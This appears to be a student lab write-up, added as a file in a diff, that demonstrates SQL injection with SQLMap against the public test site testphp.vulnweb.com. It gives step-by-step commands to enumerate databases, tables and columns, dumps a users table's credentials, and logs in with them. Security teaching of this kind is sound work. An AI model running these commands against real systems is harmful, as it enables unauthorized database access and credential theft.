@@ -1,0 +1,121 @@
+Experiment No. 08: Demonstrating SQL Injection Using SQLMap
+Aim:
+To demonstrate SQL Injection using SQLMap.
+
+Theory:
+SQL Injection is a code injection technique where an attacker executes malicious SQL queries to manipulate a web application's database. This attack can be used to retrieve or modify data, such as user details, passwords, or sensitive information stored in the database.
+
+What is SQL Injection?
+SQL Injection occurs when an attacker exploits vulnerabilities in a web application's input fields (such as URLs or forms) to send malicious SQL queries. This happens because the web application improperly filters or sanitizes user inputs, allowing attackers to interact directly with the database.
+
+In a typical SQL injection attack, the attacker sends specially crafted SQL statements through a web application’s input fields (often in URLs or forms). If the application doesn’t properly validate inputs, the database may interpret the input as a legitimate SQL query.
+
+SQLMap:
+SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It can be used to access, manipulate, and take control of a database on a vulnerable server.
+
+Installation of SQLMap (if not pre-installed):
+
+bash
+Copy code
+sudo apt-get install sqlmap
+Basic Syntax of SQLMap:
+
+bash
+Copy code
+sqlmap -u <url> --<options>
+Where:
+
+-u <url>: The target URL.
+--<options>: Various options for SQLMap, such as --dbs (to list databases), -D (to specify a database), --tables (to list tables), and more.
+Steps for SQL Injection Using SQLMap:
+Step 1: Identify SQL Injection Vulnerability
+Use SQLMap to check whether the target website is vulnerable to SQL injection.
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"
+This will test the URL to see if it is vulnerable. The result will display whether SQL injection is possible and show details of any exploitable databases.
+
+Step 2: Listing Databases
+Once you confirm that the site is vulnerable, you can list the available databases using the following command:
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
+This will display the names of all the databases that can be accessed. For example, it may return:
+
+markdown
+Copy code
+Databases:
+* acuart
+* information_schema
+Step 3: Accessing Tables in a Database
+Next, to explore a specific database (e.g., acuart), you can list the tables within the database:
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
+This will display all the tables in the acuart database:
+
+markdown
+Copy code
+Tables:
+* artists
+* carts
+* customers
+* gallery
+* orders
+* products
+* users
+Step 4: Accessing Columns in a Table
+Once the tables are listed, we can explore the columns of a specific table. For example, if we are interested in the users table, we can use the following command:
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns
+This will show the columns in the users table:
+
+markdown
+Copy code
+Columns:
+* id
+* uname
+* pass
+Step 5: Extracting Data from Columns
+Now, you can retrieve the actual data stored in a specific column, such as the username (uname) and password (pass):
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump
+This will show the usernames in the uname column:
+
+bash
+Copy code
+uname:
+* test
+Similarly, to extract the password, use:
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump
+This will reveal the password for the username:
+
+bash
+Copy code
+pass:
+* test
+Step 6: Logging in Using Extracted Credentials
+After retrieving the username (test) and password (test), you can try logging into the website using the following credentials:
+
+Username: test
+Password: test
+If successful, it confirms that SQL injection allowed unauthorized access to sensitive data.
+
+Conclusion:
+In this experiment, we demonstrated how SQL Injection can be used to exploit a vulnerable website using SQLMap. By extracting information such as usernames and passwords from a database, SQL injection shows how dangerous this vulnerability can be. It is essential to implement proper input validation and sanitization techniques to protect web applications from such attacks.
+
+
+
+
+
+
